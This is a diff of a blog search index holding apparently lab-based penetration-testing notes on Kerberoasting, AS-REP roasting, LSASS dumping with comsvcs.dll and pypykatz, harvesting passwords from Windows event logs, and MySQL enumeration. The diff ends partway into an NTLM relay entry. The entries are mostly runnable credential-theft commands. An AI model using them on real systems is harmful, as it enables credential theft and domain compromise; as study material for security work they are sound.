@@ -685,44 +685,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Cross-Forest : Kerberoasting</title>
-    <url>/2025/12/03/Cross-Forest-Kerberoasting/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><blockquote>
-<p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p>
-</blockquote>
-<h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
-
-<h3 id="Request-TGS"><a href="#Request-TGS" class="headerlink" title="Request TGS"></a>Request TGS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain-1"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain-1" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> &lt;CrossDomainName&gt; | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜  We see that there is one account with an SPN in the target domain which is <code>mssqlsvc</code>.</p>
-</blockquote>
-<h3 id="Performing-a-Kerberoasting"><a href="#Performing-a-Kerberoasting" class="headerlink" title="Performing a Kerberoasting"></a>Performing a Kerberoasting</h3><blockquote>
-<p>➜ It’s the same as normal kerberoasting but in this case we add <code>/domain</code> and specify the target domain.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:&lt;CrossDomainName&gt; /user:tar<span class="built_in">get-user</span> /nowrap</span><br></pre></td></tr></table></figure>
-
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Cross Forest</category>
-        <category>Kerberoasting</category>
-      </categories>
-      <tags>
-        <tag>PowerView</tag>
-        <tag>Rubeus</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DPAPI</title>
     <url>/2025/11/26/DPAPI/</url>
     <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
@@ -844,29 +806,41 @@
       </tags>
   </entry>
   <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+    <title>Cross-Forest : Kerberoasting</title>
+    <url>/2025/12/03/Cross-Forest-Kerberoasting/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><blockquote>
+<p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p>
+</blockquote>
+<h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
 
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+<h3 id="Request-TGS"><a href="#Request-TGS" class="headerlink" title="Request TGS"></a>Request TGS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain-1"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain-1" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> &lt;CrossDomainName&gt; | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜  We see that there is one account with an SPN in the target domain which is <code>mssqlsvc</code>.</p>
+</blockquote>
+<h3 id="Performing-a-Kerberoasting"><a href="#Performing-a-Kerberoasting" class="headerlink" title="Performing a Kerberoasting"></a>Performing a Kerberoasting</h3><blockquote>
+<p>➜ It’s the same as normal kerberoasting but in this case we add <code>/domain</code> and specify the target domain.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:&lt;CrossDomainName&gt; /user:tar<span class="built_in">get-user</span> /nowrap</span><br></pre></td></tr></table></figure>
+
+
+
+
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
+        <category>Exploitation</category>
+        <category>Cross Forest</category>
+        <category>Kerberoasting</category>
       </categories>
       <tags>
-        <tag>Dump-Lsass</tag>
+        <tag>PowerView</tag>
+        <tag>Rubeus</tag>
       </tags>
   </entry>
   <entry>
@@ -907,6 +881,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-Lsass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Enumerating &amp; Retrieving Password Policies</title>
     <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
     <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
@@ -937,6 +937,35 @@
         <tag>rpcclient</tag>
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Event Log Readers</title>
+    <url>/2026/03/06/Event-Log-Readers/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+</blockquote>
+<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
+<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
+<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>wevtutil</tag>
       </tags>
   </entry>
   <entry>
@@ -979,32 +1008,38 @@
       </tags>
   </entry>
   <entry>
-    <title>Event Log Readers</title>
-    <url>/2026/03/06/Event-Log-Readers/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+    <title>Kerberoasting &amp; ASREPRoasting</title>
+    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
+    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
+
+<p>GetNPUsers</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
 </blockquote>
-<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
-<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
+<p>Requesting TGS Ticket For Specific Account : </p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
-<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Requesting all TGS Tickets : </p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
-        <category>Privesc</category>
-        <category>Groups</category>
+        <category>Exploitation</category>
+        <category>Kerberoasting &amp; ASREPRoasting</category>
       </categories>
       <tags>
-        <tag>wevtutil</tag>
+        <tag>impacket-GetNPUsers</tag>
       </tags>
   </entry>
   <entry>
@@ -1048,41 +1083,6 @@
         <category>Privesc</category>
         <category>Groups</category>
       </categories>
-  </entry>
-  <entry>
-    <title>Kerberoasting &amp; ASREPRoasting</title>
-    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
-    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
-
-<p>GetNPUsers</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
-<p>Requesting TGS Ticket For Specific Account : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Requesting all TGS Tickets : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Kerberoasting &amp; ASREPRoasting</category>
-      </categories>
-      <tags>
-        <tag>impacket-GetNPUsers</tag>
-      </tags>
   </entry>
   <entry>
     <title>Linux Credential Hunting</title>
@@ -1356,47 +1356,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Enumeration</title>
-    <url>/2025/11/21/MySQL-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
-<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
-<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
-
-<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Exploitation</title>
     <url>/2025/11/21/MySQL-Exploitation/</url>
     <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
@@ -1434,158 +1393,6 @@
         <tag>Exploitation</tag>
         <tag>MySQL-Read-Files</tag>
         <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NTLM relay SMB To SMB</title>
-    <url>/2026/06/12/NTLM-relay-SMB-To-SMB/</url>
-    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><blockquote>
-<ul>
-<li><p>The machine we relay from should be vulnerable to one of these coercion methods</p>
-</li>
-<li><p><code>SMB signing</code> on the machine we relay to should be <code>disabled</code> or <code>enabled</code>.</p>
-</li>
-</ul>
-</blockquote>
-<p><img src="/img/ntlm-relay-smb-to-smb.png" alt="NTLM Relay SMB to SMB"></p>
-<blockquote>
-<p>➜ Self-relay (relaying back to the same host that authenticated) has been patched since MS08-068, the machine we relay to must therefore be a different machine from the machine we relay from.</p>
-</blockquote>
-<blockquote>
